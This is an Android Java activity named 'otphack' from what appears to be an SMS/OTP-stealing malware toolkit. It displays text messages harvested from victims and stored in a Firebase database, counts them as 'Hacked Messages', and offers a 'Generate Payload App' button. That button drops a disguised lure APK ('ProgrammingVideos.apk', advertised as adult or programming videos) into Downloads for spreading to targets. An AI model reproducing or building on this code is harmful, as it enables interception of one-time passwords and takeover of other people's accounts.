package com.umrani.tool.view.main;

import android.Manifest;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.umrani.tool.R;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class otphack extends AppCompatActivity {
    private TextView smsTextView;
    private TextView totalMessagesTextView;
    private static final int PERMISSION_REQUEST_WRITE_EXTERNAL_STORAGE = 123;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_otphack);

        smsTextView = findViewById(R.id.smsTextView);
        totalMessagesTextView = findViewById(R.id.totalMessagesTextView);

        // Retrieve SMS messages from Firebase
        DatabaseReference databaseRef = FirebaseDatabase.getInstance().getReference("sms");
        databaseRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                StringBuilder sb = new StringBuilder();
                int totalMessages = (int) dataSnapshot.getChildrenCount();

                // Create a list to store the messages
                List<String> messages = new ArrayList<>();
                for (DataSnapshot smsSnapshot : dataSnapshot.getChildren()) {
                    String message = smsSnapshot.child("message").getValue(String.class);
                    if (message != null) {
                        messages.add(message);
                    }
                }
                // Reverse the list
                Collections.reverse(messages);
                for (String message : messages) {
                    sb.append("Sender: Umrani \uD83D\uDE08").append("\n");
                    sb.append("Message: ").append(message).append("\n\n");
                }

                smsTextView.setText(sb.toString());
                totalMessagesTextView.setText("Total Hacked Messages: " + totalMessages);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                // Handle error if retrieval is canceled or fails
            }
        });

        Button downloadPayload = findViewById(R.id.downloadpayload);
        downloadPayload.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showDownloadDialog();
            }
        });
    }

    private void showDownloadDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(otphack.this);
        builder.setTitle("Generate Payload App");
        builder.setPositiveButton("Xnxx Payload App", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                copyApkToDownloads("ProgrammingVideos.apk");
            }
        });

        builder.setNegativeButton("Programming Payload App", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                copyApkToDownloads("ProgrammingVideos.apk");
            }
        });

        AlertDialog dialog = builder.create();
        dialog.show();
    }

    private void copyApkToDownloads(String fileName) {
        if (ContextCompat.checkSelfPermission(otphack.this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(otphack.this,
                    new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},
                    PERMISSION_REQUEST_WRITE_EXTERNAL_STORAGE);
        } else {
            performApkCopy(fileName);
        }
    }

    private void performApkCopy(String fileName) {
        InputStream inputStream;
        OutputStream outputStream;
        try {
            inputStream = getAssets().open(fileName);
            File downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            File outputFile = new File(downloadsDir, fileName);
            outputStream = new FileOutputStream(outputFile);

            byte[] buffer = new byte[1024];
            int length;
            while ((length = inputStream.read(buffer)) > 0) {
                outputStream.write(buffer, 0, length);
            }

            outputStream.flush();
            outputStream.close();
            inputStream.close();

            Toast.makeText(otphack.this, "App saved in Downloads", Toast.LENGTH_SHORT).show();
        } catch (IOException e) {
            e.printStackTrace();
            Toast.makeText(otphack.this, "Failed to Generate App", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_WRITE_EXTERNAL_STORAGE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(otphack.this, "Permission granted. App Generated .", Toast.LENGTH_SHORT).show();
                // Replace "xnxx_payload.apk" with the appropriate APK file name
                copyApkToDownloads("ProgrammingVideos.apk");
                copyApkToDownloads("ProgrammingVideos.apk");
            } else {
                Toast.makeText(otphack.this, "Permission denied. Unable to Generate App.", Toast.LENGTH_SHORT).show();
            }
        }
    }
}
